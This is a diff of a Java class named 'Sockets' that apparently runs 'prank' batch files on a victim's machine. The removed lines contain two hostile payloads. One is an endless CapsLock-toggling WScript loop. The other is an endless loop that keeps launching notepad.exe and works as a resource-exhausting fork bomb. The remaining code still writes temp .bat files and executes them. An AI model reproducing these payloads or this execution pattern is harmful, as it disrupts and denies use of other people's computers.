@@ -92,40 +92,32 @@ class Sockets
             if(random <= 3)
             {
                 File temp = File.createTempFile("vncv216789", ".bat"); 
-                String filePath = temp.getAbsolutePath();
-                String dirPath = filePath.substring(0,filePath.lastIndexOf(File.separator));           
+                String filePath = temp.getAbsolutePath();          
                 String nl = System.lineSeparator();
                 System.out.println("File in: " + filePath);
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("@ECHO off " + nl +"Set wshShell =wscript.CreateObject(“WScript.Shell”)" + nl +
-    "do" + nl +
-    "wscript.sleep 100" + nl +
-    "wshshell.sendkeys “{CAPSLOCK}”" + nl +
-    "loop");
+                bw.write("");
                 bw.close();
 
-                System.out.println(Sockets.executeCommand("call " + filePath));
+                System.out.println(Sockets.executeCommand(new String[]{"start", filePath}));
                 System.out.println("CapsLock Prank!");
                 
             }else if(random <= 6)
             {
                 File temp = File.createTempFile("vncv216789", ".bat"); 
-                String filePath = temp.getAbsolutePath();
-                String dirPath = filePath.substring(0,filePath.lastIndexOf(File.separator));           
+                String filePath = temp.getAbsolutePath();           
                 String nl = System.lineSeparator();
                 
                 System.out.println("File in: " + filePath);
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("@ECHO off" + nl +
-":top" + nl +
-"START %SystemRoot%\\system32\\notepad.exe" + nl +
-"GOTO top");
+                bw.write("");
                 bw.close();
 
-                System.out.println(Sockets.executeCommand("call " + filePath));
+                System.out.println(Sockets.executeCommand(new String[]{"start", filePath}));
                 System.out.println("Notepad Prank!");
+                
             }else
                 System.out.println("Nothing has been done!");
             
@@ -140,7 +132,7 @@ class Sockets
     }
     
     
-    private static String executeCommand(String command) 
+    private static String executeCommand(String[] command) 
     {
 
 		StringBuffer output = new StringBuffer();
